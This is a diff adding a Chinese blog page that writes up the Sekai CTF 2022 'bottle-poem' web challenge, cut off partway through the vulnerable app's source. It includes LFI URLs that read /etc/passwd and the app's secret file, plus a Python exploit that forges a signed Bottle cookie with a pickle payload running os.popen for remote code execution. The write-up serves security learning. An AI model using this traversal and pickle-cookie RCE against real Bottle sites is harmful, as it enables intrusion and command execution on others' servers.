@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="国外比赛难度确实逆天">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sekai CTF 2022">
+<meta property="og:url" content="https://ttoc.fun/2022SekaiCTF/index.html">
+<meta property="og:site_name" content="Ttoc&#39;s blog">
+<meta property="og:description" content="国外比赛难度确实逆天">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003101420158.png">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003104433566.png">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003201506807.png">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003201547093.png">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003202543907.png">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003202814644.png">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003135130855.png">
+<meta property="og:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003162948932.png">
+<meta property="article:published_time" content="2023-02-13T15:13:06.374Z">
+<meta property="article:modified_time" content="2023-08-06T08:02:12.273Z">
+<meta property="article:author" content="Ttoc">
+<meta property="article:tag" content="Game">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttoc.fun/2022SekaiCTF/image-20221003101420158.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Sekai CTF 2022</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li>
+          <li><a href="/archives/">文章</a></li>
+        <li><a href="/search/">搜索</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022DASCTF%20X%20GFCTF%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022NewStarCTF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/2022SekaiCTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/2022SekaiCTF/&text=Sekai CTF 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/2022SekaiCTF/&is_video=false&description=Sekai CTF 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sekai CTF 2022&body=Check out this article: https://ttoc.fun/2022SekaiCTF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/2022SekaiCTF/&title=Sekai CTF 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/2022SekaiCTF/&name=Sekai CTF 2022&description=&lt;p&gt;&lt;code&gt;国外比赛难度确实逆天&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/2022SekaiCTF/&t=Sekai CTF 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sekai-CTF-2022"><span class="toc-number">1.</span> <span class="toc-text">Sekai CTF 2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-bottle-poem-%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0%E4%BA%86%EF%BC%8C%E8%A1%A5%E4%B8%8A%E8%87%AA%E5%B7%B1%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">1.bottle-poem[后续学习了，补上自己的思路]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.1.</span> <span class="toc-text">*查看当前进程的启动命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-sekai-game-start"><span class="toc-number">1.2.</span> <span class="toc-text">2.sekai-game-start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%80%83%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">关键考点</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Sekai CTF 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ttoc</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-02-13T15:13:06.374Z" class="dt-published" itemprop="datePublished">2023-02-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">网络安全学习</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Game/" rel="tag">Game</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><code>国外比赛难度确实逆天</code></p>
+<span id="more"></span>
+
+<h1 id="Sekai-CTF-2022"><a href="#Sekai-CTF-2022" class="headerlink" title="Sekai CTF 2022"></a>Sekai CTF 2022</h1><p><a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a></p>
+<p>这是官方的<code>wp</code>和题目的<code>docker</code>，我后面还是把<code>web</code>都复现一下</p>
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003101420158.png"><img src="/2022SekaiCTF/image-20221003101420158.png" alt="image-20221003101420158"></a></p>
+<p><code>大比赛，每个题要么难出头，要么感觉就差一点，与大佬的差距，鼠鼠只能赛后复现wp了</code></p>
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003104433566.png"><img src="/2022SekaiCTF/image-20221003104433566.png" alt="image-20221003104433566"></a></p>
+<p><code>这是web难度【看起来就是按解题人数来分】</code></p>
+<h2 id="1-bottle-poem-后续学习了，补上自己的思路"><a href="#1-bottle-poem-后续学习了，补上自己的思路" class="headerlink" title="1.bottle-poem[后续学习了，补上自己的思路]"></a>1.bottle-poem[后续学习了，补上自己的思路]</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hint：</span><br><span class="line"></span><br><span class="line">Come <span class="keyword">and</span> read poems <span class="keyword">in</span> the bottle.</span><br><span class="line"></span><br><span class="line">No bruteforcing <span class="keyword">is</span> required to solve this challenge. Please do <span class="keyword">not</span> use scanner tools. Rate limiting <span class="keyword">is</span> applied. Flag <span class="keyword">is</span> executable on server.</span><br><span class="line"></span><br><span class="line">翻译：</span><br><span class="line"></span><br><span class="line">快来读一读瓶中的诗吧。</span><br><span class="line"></span><br><span class="line">解决这一挑战不需要暴力破解。请不要使用扫描仪工具。应用速率限制。标志在服务器上是可执行的。</span><br></pre></td></tr></table></figure>
+
+<p>这道题我已经秃头了，开始觉得是单纯的文件包含，但是后面看到官方发的wp，感觉又没那么简单</p>
+<p>我先直接展示官方的wp，然后再展示我复现的过程</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Hey guys Thx <span class="keyword">for</span> attending SekaiCTF  i made two challenges <span class="keyword">for</span> this competition one <span class="keyword">is</span> bottle poem another <span class="keyword">is</span> sekaigame start</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> the bottle poem most of people think its guessy <span class="keyword">and</span> at the start the challenge always down  so say sorry to u <span class="keyword">and</span> respect to my buddy hfz that he fix this challenge </span><br><span class="line"></span><br><span class="line">here <span class="keyword">is</span> my short wp</span><br><span class="line">-----------------</span><br><span class="line">it<span class="string">&#x27;s easy to find that this website has LFI</span></span><br><span class="line"><span class="string">u wanna to  read file directly but failed </span></span><br><span class="line"><span class="string">that&#x27;</span>s <span class="keyword">not</span> show u that we hide it  that means u havent enough execute permission to read it (so we update description that flag <span class="keyword">is</span> executable <span class="keyword">and</span> u dont need some bruteforcing <span class="keyword">or</span> guessing)flag <span class="keyword">is</span> <span class="keyword">in</span> the common path /flag</span><br><span class="line"></span><br><span class="line">so we need to read source</span><br><span class="line">just like this</span><br><span class="line"></span><br><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/proc/self/cwd/app.py</span><br><span class="line"></span><br><span class="line">so dont need to bruteforce proc/self/ just use it to got sourcecode</span><br><span class="line"></span><br><span class="line">use this way u can read the secret --sekai</span><br><span class="line"></span><br><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/proc/self/cwd/config/secret.py</span><br><span class="line"></span><br><span class="line">now u can control the cookies but <span class="keyword">if</span> u read something just like /views/admin.html <span class="keyword">or</span> just make guest to admin u would find its a troll </span><br><span class="line"></span><br><span class="line">so u need rce truely <span class="keyword">if</span> u search some documentation will find the bottle<span class="string">&#x27;s cookie_decode() will unpickle so use this to get rce</span></span><br><span class="line"><span class="string">https://github.com/bottlepy/bottle/issues/900</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">here the steps</span></span><br><span class="line"><span class="string">1.lfi to read file and    secret</span></span><br><span class="line"><span class="string">2.use cookie pickle rce to reverse a shell</span></span><br><span class="line"><span class="string">3.execute /flag to get flag</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">and my exp </span></span><br><span class="line"><span class="string">-------------</span></span><br><span class="line"><span class="string">demo exp</span></span><br><span class="line"><span class="string">import base64,hashlib,pickle,hmac</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">def tob(s, enc=&#x27;</span>utf8<span class="string">&#x27;):</span></span><br><span class="line"><span class="string">    if isinstance(s, str):</span></span><br><span class="line"><span class="string">        return s.encode(enc)</span></span><br><span class="line"><span class="string">    return b&#x27;</span><span class="string">&#x27; if s is None else bytes(s)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def cookie_encode(data, key):</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span> Encode <span class="keyword">and</span> sign a pickle-able <span class="built_in">object</span>. Return a (byte) string <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    msg = base64.b64encode(pickle.dumps(data, 0))</span></span><br><span class="line"><span class="string">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span></span><br><span class="line"><span class="string">    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class test():</span></span><br><span class="line"><span class="string">    def __reduce__(self):</span></span><br><span class="line"><span class="string">        return (eval,(&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;,))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">obj = test()</span></span><br><span class="line"><span class="string">a = cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)</span></span><br><span class="line"><span class="string">print(a)</span></span><br></pre></td></tr></table></figure>
+
+<p>翻译</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">大家好，感谢参加 SekaiCTF 我为这次比赛提出了两个挑战，一个是瓶子诗，另一个是 sekaigame start</span><br><span class="line"></span><br><span class="line">对于瓶子诗，大多数人认为它是猜测性的，一开始挑战总是失败，所以向你说声抱歉，并尊重我的好友 hfz，他解决了这个挑战</span><br><span class="line"></span><br><span class="line">这是我的简短 wp</span><br><span class="line">-----------------</span><br><span class="line">很容易发现这个网站有LFI（本地文件包含）</span><br><span class="line">你想直接读取文件但失败了</span><br><span class="line">这并没有告诉你我们隐藏它，这意味着你没有足够的执行权限来读取它（所以我们更新了标志是可执行的并且你不需要一些暴力破解或猜测的描述）标志在公共路径/标志中</span><br><span class="line"></span><br><span class="line">所以我们需要阅读源码</span><br><span class="line">像这样</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd/app.py</span><br><span class="line"></span><br><span class="line">所以不需要蛮力 proc<span class="regexp">/self/</span> 只需使用它来获取源代码</span><br><span class="line"></span><br><span class="line">使用这种方式你可以阅读秘密--sekai</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd<span class="regexp">/config/</span>secret.py</span><br><span class="line"></span><br><span class="line">现在您可以控制 cookie，但如果您阅读 <span class="regexp">/views/</span>admin.html 之类的内容，或者只是让访客成为管理员，您会发现它是一个巨魔（可以理解为恶搞）</span><br><span class="line"></span><br><span class="line">所以你真的需要 rce 如果你搜索一些文档会发现瓶子的 cookie_decode() 会解开所以用它来获取 rce</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/bottlepy/</span>bottle<span class="regexp">/issues/</span><span class="number">900</span></span><br><span class="line"></span><br><span class="line">这里的步骤</span><br><span class="line"><span class="number">1</span>.lfi读取文件和秘密</span><br><span class="line"><span class="number">2</span>.使用cookie pickle rce 反弹一个shell</span><br><span class="line"><span class="number">3</span>.执行/flag获取flag</span><br></pre></td></tr></table></figure>
+
+<p>官方<code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">demo exp</span><br><span class="line"><span class="keyword">import</span> base64,hashlib,pickle,hmac</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s.encode(enc)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;</span></span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, <span class="number">0</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = test()</span><br><span class="line">a = cookie_encode(obj,<span class="string">&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>下面是我复现理解操作</p>
+<p>先打开网站，看到有三个可以打开的链接</p>
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003201506807.png"><img src="/2022SekaiCTF/image-20221003201506807.png" alt="image-20221003201506807"></a></p>
+<p>先看看源码</p>
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003201547093.png"><img src="/2022SekaiCTF/image-20221003201547093.png" alt="image-20221003201547093"></a></p>
+<p>发现没什么额外的信息，三个链接是对应着三个文本文件</p>
+<p>看起来似乎是文件包含的题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=spring.txt</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003202543907.png"><img src="/2022SekaiCTF/image-20221003202543907.png" alt="image-20221003202543907"></a></p>
+<p>我们试试能不能显示其他信息，我在做的时候试的是<code>/etc/passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003202814644.png"><img src="/2022SekaiCTF/image-20221003202814644.png" alt="image-20221003202814644"></a></p>
+<p>看来是方向对了，确实是可以包含本地文件并显示，但是没有其他信息能利用</p>
+<h3 id="查看当前进程的启动命令"><a href="#查看当前进程的启动命令" class="headerlink" title="*查看当前进程的启动命令"></a>*查看当前进程的启动命令</h3><p>这个是看最后发的<code>wp</code>，学到了</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/proc/</span><span class="keyword">self</span><span class="operator">/</span>cmdline</span><br><span class="line"></span><br><span class="line"><span class="comment">//该文件包含的是该进程的命令行参数，包括进程的启动路径(argv[0])</span></span><br></pre></td></tr></table></figure>
+
+<p>然后会下载一个名叫<code>show</code>的文件</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -<span class="keyword">u</span> /<span class="keyword">app</span>/<span class="keyword">app</span>.py </span><br></pre></td></tr></table></figure>
+
+<p>在命令中，我们发现运行了一个<code>/app/app.py</code>的文件</p>
+<p>看来这就是我们网站启动的脚本，里面就有我们网站的源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/app/app.py</span><br></pre></td></tr></table></figure>
+
+<p>查看到文件源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, request, response, error</span><br><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/show&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    response.content_type = <span class="string">&quot;text/plain; charset=UTF-8&quot;</span></span><br><span class="line">    param = request.query.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../app&quot;</span>, param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No!!!!&quot;</span></span><br><span class="line">    requested_path = os.path.join(os.getcwd() + <span class="string">&quot;/poems&quot;</span>, param)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">            tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No This Poems&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=sekai)</span><br><span class="line">        <span class="keyword">if</span> <span 